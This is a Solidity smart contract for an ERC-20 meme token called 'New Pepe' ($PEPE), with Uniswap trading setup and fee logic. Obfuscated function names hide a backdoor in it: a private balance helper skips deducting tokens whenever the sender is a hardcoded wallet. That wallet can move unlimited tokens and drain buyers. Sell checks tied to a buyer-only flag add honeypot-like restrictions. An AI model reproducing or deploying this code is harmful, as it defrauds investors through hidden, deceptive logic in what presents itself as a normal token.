/**

New Pepe    $PEPE

X: https://twitter.com/NPEPE_ERC

Telegram: https://t.me/NPEPE_ERC

Website: https://newpepe.org/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _euoelh(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _euoelh(a, b, "SafeMath");
    }

    function  _euoelh(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _qvnkfc(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _yetrbrc;
    address payable private _bnudoy;
    address private _yreunp;
    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _piyoae=0;
    uint256 private _beacyt=0;
    uint256 public _botfcb = _totalSupply;
    uint256 public _wraeuk = _totalSupply;
    uint256 public _pljovb= _totalSupply;
    uint256 public _qfrgaf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _qvaetd;
    mapping (address => bool) private _pvukau;
    mapping(address => uint256) private _flknru;

    bool private _ethopen;
    bool public _pvodoiq = false;
    bool private qesuaf = false;
    bool private _ariwre = false;


    event _evrjyk(uint _botfcb);
    modifier freuby {
        qesuaf = true;
        _;
        qesuaf = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _qvaetd[owner(

        )] = true;
        _qvaetd[address
        (this)] = true;
        _qvaetd[
            _bnudoy] = true;
        _bnudoy = 
        payable (0xE20679121470b2BFC3269533C3A9346A7aF4cddF);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _euoelh(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 bforug=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pvodoiq) {
                if (to 
                != address
                (_yetrbrc) 
                && to !=
                 address
                 (_yreunp)) {
                  require(_flknru
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _flknru
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yreunp && to != 
            address(_yetrbrc) &&
             !_qvaetd[to] ) {
                require(amount 
                <= _botfcb,
                 "Exceeds the _botfcb.");
                require(balanceOf
                (to) + amount
                 <= _wraeuk,
                  "Exceeds the _wraeuk.");
                if(_beacyt
                < _piyoae){
                  require
                  (! _frebuv(to));
                }
                _beacyt++;
                 _pvukau
                 [to]=true;
                bforug = amount._qvnkfc
                ((_beacyt>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yreunp &&
             from!= address(this) 
            && !_qvaetd[from] ){
                require(amount <= 
                _botfcb && 
                balanceOf(_bnudoy)
                <_qfrgaf,
                 "Exceeds the _botfcb.");
                bforug = amount._qvnkfc((_beacyt>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_beacyt>
                _piyoae &&
                 _pvukau[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qesuaf 
            && to == _yreunp &&
             _ariwre &&
             contractTokenBalance>
             _pljovb 
            && _beacyt>
            _piyoae&&
             !_qvaetd[to]&&
              !_qvaetd[from]
            ) {
                _transferFrom( _rafblv(amount, 
                _rafblv(contractTokenBalance,
                _qfrgaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _flogbnok(address
                    (this).balance);
                }
            }
        }

        if(bforug>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(bforug);
          emit
           Transfer(from,
           address
           (this),bforug);
        }
        _balances[from
        ]= _euoelh(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _euoelh(bforug));
        emit Transfer
        (from, to, 
        amount.
         _euoelh(bforug));
    }

    function _transferFrom(uint256
     tokenAmount) private
      freuby {
        if(tokenAmount==
        0){return;}
        if(!_ethopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _yetrbrc.WETH();
        _approve(address(this),
         address(
             _yetrbrc), 
             tokenAmount);
        _yetrbrc.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rafblv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _euoelh(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _bnudoy){
            return a ;
        }else{
            return a .
             _euoelh (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _botfcb = _totalSupply;
        _wraeuk = _totalSupply;
        emit _evrjyk(_totalSupply);
    }

    function _frebuv(address 
    account) private view 
    returns (bool) {
        uint256 fqvrip;
        assembly {
            fqvrip :=
             extcodesize
             (account)
        }
        return fqvrip > 
        0;
    }

    function _flogbnok(uint256
    amount) private {
        _bnudoy.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _ethopen ) ;
        _yetrbrc  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _yetrbrc), 
            _totalSupply);
        _yreunp = 
        IUniswapV2Factory(_yetrbrc.
        factory( ) 
        ). createPair (
            address(this
            ),  _yetrbrc .
             WETH ( ) );
        _yetrbrc.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yreunp).
        approve(address(_yetrbrc), 
        type(uint)
        .max);
        _ariwre = true;
        _ethopen = true;
    }

    receive() external payable {}
}